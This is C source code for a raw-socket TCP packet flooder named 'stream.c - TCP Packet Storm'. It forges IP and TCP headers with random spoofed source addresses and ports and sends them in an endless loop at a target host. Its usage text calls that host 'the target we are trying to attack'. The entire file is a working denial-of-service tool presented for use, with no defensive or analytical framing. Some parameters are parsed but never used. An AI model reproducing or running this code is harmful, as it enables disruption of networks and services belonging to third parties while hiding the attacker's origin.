#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <strings.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#ifndef __USE_BSD
#define	__USE_BSD
#endif
#ifndef __FAVOR_BSD
#define __FAVOR_BSD
#endif
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>

#ifdef LINUX
#define FIX(x)	htons(x)
#else
#define FIX(x)	(x)
#endif

struct ip_hdr {
    u_int	ip_hl:4,		/* header length in 32 bit words */
		ip_v:4;			/* ip version */
    u_char	ip_tos;			/* type of service */
    u_short	ip_len;			/* total packet length */
    u_short	ip_id;			/* identification */
    u_short	ip_off;			/* fragment offset */
    u_char	ip_ttl;			/* time to live */
    u_char	ip_p;			/* protocol */
    u_short	ip_sum;			/* ip checksum */
    u_long	saddr, daddr;		/* source and dest address */
};

struct tcp_hdr {
    u_short	th_sport;		/* source port */
    u_short	th_dport;		/* destination port */
    u_long	th_seq;			/* sequence number */
    u_long	th_ack;			/* acknowledgement number */
    u_int	th_x2:4,		/* unused */
		th_off:4;		/* data offset */
    u_char	th_flags;		/* flags field */
    u_short	th_win;			/* window size */
    u_short	th_sum;			/* tcp checksum */
    u_short	th_urp;			/* urgent pointer */
};

struct tcpopt_hdr {
    u_char  type;			/* type */
    u_char  len;				/* length */
    u_short value;			/* value */
};

struct pseudo_hdr {			/* See RFC 793 Pseudo Header */
    u_long saddr, daddr;			/* source and dest address */
    u_char mbz, ptcl;			/* zero and protocol */
    u_short tcpl;			/* tcp length */
};

struct packet {
    struct ip/*_hdr*/ ip;
    struct tcphdr tcp;
/* struct tcpopt_hdr opt; */
};

struct cksum {
    struct pseudo_hdr pseudo;
    struct tcphdr tcp;
};

struct packet packet;
struct cksum cksum;
struct sockaddr_in s_in;
u_short dstport, pktsize, pps;
u_long dstaddr;
int sock;

void usage(char *progname)
{
    fprintf(stderr, "Usage: %s <dstaddr> <dstport> <pktsize> <pps>\n", 
progname);
    fprintf(stderr, "    dstaddr  - the target we are trying to attack.\n");
    fprintf(stderr, "    dstport  - the port of the target, 0 = random.\n");
    fprintf(stderr, "    pktsize  - the extra size to use.  0 = normal 
syn.\n");
    exit(1);
}

/* This is a reference internet checksum implimentation, not very fast */
inline u_short in_cksum(u_short *addr, int len)
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;

     /* Our algorithm is simple, using a 32 bit accumulator (sum), we add
      * sequential 16 bit words to it, and at the end, fold back all the
      * carry bits from the top 16 bits into the lower 16 bits. */

     while (nleft > 1)  {
         sum += *w++;
         nleft -= 2;
     }

     /* mop up an odd byte, if necessary */
     if (nleft == 1) {
         *(u_char *)(&answer) = *(u_char *) w;
         sum += answer;
     }

     /* add back carry outs from top 16 bits to low 16 bits */
     sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
     sum += (sum >> 16);         	/* add carry */
     answer = ~sum;              	/* truncate to 16 bits */
     return(answer);
}

u_long lookup(char *hostname)
{
    struct hostent *hp;

    if ((hp = gethostbyname(hostname)) == NULL) {
       fprintf(stderr, "Could not resolve %s.\n", hostname);
       exit(1);
    }

    return *(u_long *)hp->h_addr;
}

void flooder(void)
{
    struct timespec ts;
    int i;

    memset(&packet, 0, sizeof(packet));

    ts.tv_sec			= 0;
    ts.tv_nsec			= 10;

    packet.ip.ip_hl		= 5;
    packet.ip.ip_v		= 4;
    packet.ip.ip_p		= IPPROTO_TCP;
    packet.ip.ip_tos		= 0x08;
    packet.ip.ip_id 		= rand();
    packet.ip.ip_len		= FIX(sizeof(packet));
    packet.ip.ip_off		= 0; /* IP_DF? */
    packet.ip.ip_ttl		= 255;
    packet.ip.ip_dst.s_addr	= dstaddr;

    packet.tcp.th_flags		= 0;
    packet.tcp.th_win		= htons(16384);
    packet.tcp.th_seq		= random();
    packet.tcp.th_ack		= 0;
    packet.tcp.th_off		= 5; /* 5 */
    packet.tcp.th_urp		= 0;
    packet.tcp.th_sport		= rand();
    packet.tcp.th_dport		= dstport?htons(dstport):rand();

/*
    packet.opt.type		= 0x02;
    packet.opt.len		= 0x04;
    packet.opt.value		= htons(1460);
*/


    cksum.pseudo.daddr		= dstaddr;
    cksum.pseudo.mbz		= 0;
    cksum.pseudo.ptcl		= IPPROTO_TCP;
    cksum.pseudo.tcpl		= htons(sizeof(struct tcphdr));

    s_in.sin_family		= AF_INET;
    s_in.sin_addr.s_addr		= dstaddr;
    s_in.sin_port		= packet.tcp.th_dport;

    for(i=0;;++i) {
    cksum.pseudo.saddr = packet.ip.ip_src.s_addr = random();
       ++packet.ip.ip_id;
       ++packet.tcp.th_sport;
       ++packet.tcp.th_seq;

       if (!dstport)
          s_in.sin_port = packet.tcp.th_dport = rand();

       packet.ip.ip_sum		= 0;
       packet.tcp.th_sum		= 0;

       cksum.tcp			= packet.tcp;

       packet.ip.ip_sum		= in_cksum((void *)&packet.ip, 20);
       packet.tcp.th_sum		= in_cksum((void *)&cksum, sizeof(cksum));

       if (sendto(sock, &packet, sizeof(packet), 0, (struct sockaddr 
*)&s_in, sizeof(s_in)) < 0)
          perror("jess");

    }
}

int main(int argc, char *argv[])
{
    int on = 1;

    printf("stream.c v1.0 - TCP Packet Storm\n");

    if ((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
       perror("socket");
       exit(1);
    }

    setgid(getgid()); setuid(getuid());

    if (argc < 4)
       usage(argv[0]);

    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 
0) {
       perror("setsockopt");
       exit(1);
    }

    srand((time(NULL) ^ getpid()) + getppid());

    printf("\nResolving IPs..."); fflush(stdout);

    dstaddr	= lookup(argv[1]);
    dstport	= atoi(argv[2]);
    pktsize	= atoi(argv[3]);

    printf("Sending..."); fflush(stdout);

    flooder();

    return 0;
}

